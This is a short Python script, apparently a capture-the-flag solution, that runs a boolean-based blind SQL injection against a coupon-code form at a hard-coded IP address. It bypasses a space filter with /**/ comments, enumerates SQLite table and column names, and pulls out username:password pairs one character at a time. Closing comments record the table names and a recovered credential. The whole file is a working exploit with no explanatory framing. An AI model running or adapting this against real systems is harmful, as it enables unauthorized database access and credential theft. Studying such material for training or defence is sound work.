# blacklist spasi diganti jdi /**/
import requests as req
import string

domain = string.ascii_letters + string.digits + "\n" + "/|,}{_.:!@$^&*()#"
url = "http://139.59.101.79:1024/couponcode"
check = "Berhasil"

def get_table():
    temp = ""
    index = 1
    loop = 0
    
    while True:
        if loop == 1:
            print("\nTable name => " + temp + "\n")
            return temp
            
        elif loop == 0:
            for char in domain:
                payload = "' OR (SELECT SUBSTR(GROUP_CONCAT(tbl_name), {}, 1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%') = '{}' -- -".format(index, char)
                payload = payload.replace(" ", "/**/")

                data = dict(couponcode=payload, post="submit")

                r = req.post(url, data)

                if check in r.text:
                    temp += char
                    index += 1
                    print(temp)
                    break
                
                elif char == "#":
                    loop = 1

def get_column():
    temp = ""
    index = 1
    loop = 0
    
    while True:
        if loop == 1:
            print("\nColumn name => " + temp + "\n")
            return temp
            
        elif loop == 0:
            for char in domain:
                payload = "' OR (SELECT SUBSTR(GROUP_CONCAT(name), {}, 1) FROM pragma_table_info('users')) = '{}' -- -".format(index, char)
                payload = payload.replace(" ", "/**/")

                data = dict(couponcode=payload, post="submit")
                r = req.post(url, data)

                if check in r.text:
                    temp += char
                    index += 1
                    print(temp)
                    break
                
                elif char == "#":
                    loop = 1

def get_creds():
    temp = ""
    index = 1
    loop = 0
    
    while True:
        if loop == 1:
            print("\nCreds => " + temp + "\n")
            return temp
            
        elif loop == 0:
            for char in domain:
                payload = "' OR (SELECT SUBSTR(GROUP_CONCAT(username || ':' || password), {}, 1) FROM users) = '{}' -- -".format(index, char)
                payload = payload.replace(" ", "/**/")

                data = dict(couponcode=payload, post="submit")
                r = req.post(url, data)


                if check in r.text:
                    temp += char
                    index += 1
                    print(temp)
                    break
                
                elif char == "#":
                    loop = 1

get_table() # users, couponcode
get_column() # id, username, password
get_creds() # nopnopnop:n0p_w4S_h3Re